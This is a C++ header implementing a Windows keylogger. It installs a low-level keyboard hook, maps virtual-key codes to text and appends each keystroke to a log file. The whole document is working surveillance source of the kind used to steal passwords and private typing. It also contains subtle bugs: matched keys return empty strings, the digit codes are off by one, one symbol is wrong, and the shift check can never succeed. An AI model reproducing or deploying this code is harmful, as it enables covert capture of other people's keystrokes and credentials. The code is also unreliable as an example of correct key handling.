#pragma once

// File handling
#include <fstream>

// Time
#include <ctime>

// Map (from std)
#include <map>

// Strings
#include <string>

// Windows specific functions
#include <Windows.h>

#include "pch.h"

namespace CKeyLogger
{
	// -------------------------------------------------------------------------------
	// Private members

	// The time when the user last pressed a key
	static clock_t lastKeyPressTime;

	// Handle to the log file
	static std::ofstream logFile;

	// Low level keyboard hook
	static HHOOK keyboardHook;

	// Whether or not the user is currently holding the "Shift" key
	static bool isHoldingShift;

	// --------------------------------------------------------------------

	// Converts a code given by the Keyboard Hook into an equivalent string
	std::string CodeToStr(DWORD code, bool upperCase)
	{
		std::string keyStr;

		// Code mapping can be seen here: https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes

		struct Key
		{
			std::string lowerCase;
			std::string upperCase;
		};

		const std::map<DWORD, Key> keys =
		{
			// Numbers
			{ 0x39,			{"0", ")"}	},
			{ VK_NUMPAD0,	{"0", "0"}	},

			{ 0x30,			{"1", "!"}	},
			{ VK_NUMPAD1,	{"1", "1"}	},

			{ 0x31,			{"2", "\""}	},
			{ VK_NUMPAD2,	{"2", "2"}	},

			{ 0x32,			{"3", "£"}	},
			{ VK_NUMPAD3,	{"3", "3"}	},

			{ 0x33,			{"4", "$"}	},
			{ VK_NUMPAD4,	{"4", "4"}	},

			{ 0x34,			{"5", "%"}	},
			{ VK_NUMPAD5,	{"5", "5"}	},

			{ 0x35,			{"6", "^"}	},
			{ VK_NUMPAD6,	{"6", "6"}	},

			{ 0x36,			{"7", "&"}	},
			{ VK_NUMPAD7,	{"7", "7"}	},

			{ 0x37,			{"8", "*"}	},
			{ VK_NUMPAD8,	{"8", "8"}	},

			{ 0x38,			{"9", "("}	},
			{ VK_NUMPAD9,	{"9", "9"}	},

			// Letters
			{ 0x41,			{"a", "A"}	},
			{ 0x42,			{"b", "B"}	},
			{ 0x43,			{"c", "C"}	},
			{ 0x44,			{"d", "D"}	},
			{ 0x45,			{"e", "E"}	},
			{ 0x46,			{"f", "F"}	},
			{ 0x47,			{"g", "G"}	},
			{ 0x48,			{"h", "H"}	},
			{ 0x49,			{"i", "I"}	},
			{ 0x4A,			{"j", "J"}	},
			{ 0x4B,			{"k", "K"}	},
			{ 0x4C,			{"l", "L"}	},
			{ 0x4D,			{"m", "M"}	},
			{ 0x4E,			{"n", "N"}	},
			{ 0x4F,			{"o", "O"}	},
			{ 0x50,			{"p", "P"}	},
			{ 0x51,			{"q", "Q"}	},
			{ 0x52,			{"r", "R"}	},
			{ 0x53,			{"s", "S"}	},
			{ 0x54,			{"t", "T"}	},
			{ 0x55,			{"u", "U"}	},
			{ 0x56,			{"v", "V"}	},
			{ 0x57,			{"w", "W"}	},
			{ 0x58,			{"x", "X"}	},
			{ 0x59,			{"y", "Y"}	},
			{ 0x5A,			{"z", "Z"}	},


			// OEM Keys
			{ VK_OEM_PLUS,	{"=", "+"}	},
			{ VK_OEM_COMMA,	{",", "<"}	},
			{ VK_OEM_MINUS,	{"-", "_"}	},
			{ VK_OEM_PERIOD,{".", ">"}	},
			{ VK_OEM_1,		{"}", ":"}	},
			{ VK_OEM_2,		{"/", "?"}	},
			{ VK_OEM_3,		{"`", "~"}	},
			{ VK_OEM_4,		{"[", "{"}	},
			{ VK_OEM_5,		{"|", "\\"}	},
			{ VK_OEM_6,		{"]", "}"}	},
			{ VK_OEM_7,		{"'", "'"}	},

			// Miscellanous Keys
			{ VK_LWIN,		{"[WIN]",		"[WIN]"}			},
			{ VK_RWIN,		{"[WIN]",		"[WIN]"}			},
			{ VK_LSHIFT,	{"[SHIFT]",		"[SHIFT]"}			},
			{ VK_RSHIFT,	{"[SHIFT]",		"[SHIFT]"}			},
			{ VK_SHIFT,		{"[SHIFT]",		"[SHIFT]"}			},
			{ VK_LCONTROL,	{"[CTRL]",		"[CTRL]"}			},
			{ VK_RCONTROL,	{"[CTRL]",		"[CTRL]"}			},
			{ VK_NUMLOCK,	{"[NUM-LCK]",	"[NUM-LCK]"}		},
			{ VK_SCROLL,	{"[SCRLL-LCK]",	"[SCRLL-LCK]"}		},
			{ VK_BACK,		{"[BACK]",		"[BACK]"}			},
			{ VK_TAB,		{"[TAB]",		"[TAB]"}			},
			{ VK_CLEAR,		{"[CLEAR]",		"[CLEAR]"}			},
			{ VK_RETURN,	{"[ENTER]",		"[ENTER]"}			},
			{ VK_CONTROL,	{"[CTRL]",		"[CTRL]"}			},
			{ VK_LMENU,		{"[ALT]",		"[ALT]"}			},
			{ VK_RMENU,		{"[ALT]",		"[ALT]"}			},
			{ VK_MENU,		{"[ALT]",		"[ALT]"}			},
			{ VK_PAUSE,		{"[PAUSE]",		"[PAUSE]"}			},
			{ VK_CAPITAL,	{"[CAP-LCK]",	"[CAP-LCK]"}		},
			{ VK_ESCAPE,	{"[ESC]",		"[ESC]"}			},
			{ VK_SPACE,		{"[SPACE]",		"[SPACE]"}			},
			{ VK_PRIOR,		{"[PAGEUP]",	"[PAGEUP]"}			},
			{ VK_NEXT,		{"[PAGEDWN]",	"[PAGEDWN]"}		},
			{ VK_END,		{"[END]",		"[END]"}			},
			{ VK_HOME,		{"[HOME]",		"[HOME]"}			},
			{ VK_LEFT,		{"[LEFT-ARRW]",	"[LEFT-ARRW]"}		},
			{ VK_UP,		{"[UP-ARRW]",	"[UP-ARRW]"}		},
			{ VK_RIGHT,		{"[RIGHT-ARRW]","[RIGHT-ARRW]"}		},
			{ VK_DOWN,		{"[DOWN-ARRW]",	"[DOWN-ARRW]"}		},
			{ VK_SNAPSHOT,	{"[PRTSCRN]",	"[PRTSCRN]"}		},
			{ VK_INSERT,	{"[INSERT]",	"[INSERT]"}			},
			{ VK_DELETE,	{"[DELETE]",	"[DELETE]"}			}
		};

		// If the given key code has a readable alternative, fetch it, otherwise give the error icon
		if (keys.count(code))
			Key theKey = keys.at(code);
		else
			keyStr = "[OTHER]";

		return keyStr;
	}

	// Callback executed by our keyboard hook
	static LRESULT CALLBACK hookCallback(int nCode, WPARAM wParam, LPARAM lParam)
	{
		// If this is on key down (don't register on key up events or each key will be registered twice)
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			// First check whether or not the pressed key is uppercase or lowercase

			// Get state of capslock and shift keys
			bool capslock = (GetKeyState(VK_CAPITAL) & 0x0001) == 1;
			bool shift = (GetKeyState(VK_SHIFT) & 0x8000) < 0;

			// Whether or not the user is currently typing in uppercase
			bool uppercase = false;

			// If shift XOR capslock are currently active then chars will be uppercase
			if (shift ^ capslock)
			{
				uppercase = true;
			}


			// Cast lParam to KBDLLHOOKSTRUCT
			KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// Convert the virtual key code to a string representation
			std::string keyStr = CodeToStr(kbdStruct.vkCode, uppercase);

			// If it has been a while since the last key press signifiy this with a new line
			if (lastKeyPressTime == NULL || (float(clock() - lastKeyPressTime) / CLOCKS_PER_SEC) > 2.5)
				keyStr = keyStr + "\n";

			// Now we write this key to the log file
			logFile << keyStr.c_str();
			logFile.flush();

			lastKeyPressTime = clock();
		}

		// Call next hook
		return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
	}

	// -------------------------------------------------------------------------
	// Public members

	bool startLogging(std::string logFilePath)
	{
		// Now we register a low level keyboard hook with windows
		keyboardHook = SetWindowsHookEx(
			WH_KEYBOARD_LL,			// We want keyboard events
			hookCallback,	// A pointer to our callback function
			GetModuleHandle(NULL),	// A handle to the ddl containing the callback function
			NULL					// Thread containing callback function
		);

		// If we successfully hooked to the keyboard
		if (keyboardHook)
		{
			// Open the log file
			logFile.open(logFilePath, std::ios::app);

			if (!logFile.fail())
			{
				logFile << std::endl << std::endl;

				return true;
			}
		}

		return false;
	}

	void shutdownKeyLogger()
	{
		// Release keyboard hook
		UnhookWindowsHookEx(keyboardHook);

		// Close the log file
		logFile.close();
	}

};